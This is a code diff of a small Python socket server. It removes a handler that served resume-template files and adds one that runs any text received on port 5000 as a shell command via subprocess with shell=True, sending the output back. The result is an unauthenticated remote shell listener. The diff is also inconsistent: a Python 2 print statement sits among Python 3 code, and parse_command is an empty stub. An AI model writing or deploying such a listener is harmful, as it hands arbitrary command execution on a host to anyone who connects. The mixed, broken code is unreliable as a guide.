@@ -1,4 +1,6 @@
 import socket
+import os
+import subprocess
 
 serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
@@ -8,25 +10,24 @@ PORT=5000
 serverSocket.bind((HOST, PORT))
 serverSocket.listen(10)
 
-def get_file(file_name):
-        file = open(file_name, "r")
-        return file.read()
+def execute_command(command):
+    result = subprocess.check_output(command, shell=True)
+    return result
 
 def conn_handler(conn, addr):
-    response_success = 'HTTP/1.1 200 OK \n'
-    response_error = 'HTTP/1.1 404 ERROR NOT FOUND\n'
-    data = conn.recv(1024) if True else "index.html"
-    file_name = parse_filename(data.decode())
+    response_success = '200 action successfully completed \n'
+    response_error = "400 command wasn't executed\n"
+    data = conn.recv(1024) if True else "pwd"
+    command = data
+    print command
     try:
-        conn.sendto(response_success.encode() + get_file(file_name) ,addr)
+        conn.sendto(response_success.encode() + execute_command(command) ,addr)
     except Exception as e:
         conn.sendto(response_error.encode(),addr)
     conn.close()
 
-def parse_filename(data):
-    file_name = data.split("HTTP")[0].split(" /")[-1]
-    print (file_name)
-    return "resumetemplate/"+file_name.replace(" ","")
+def parse_command(data):
+    data
 
 while True:
     print ("Waiting for a connection....")
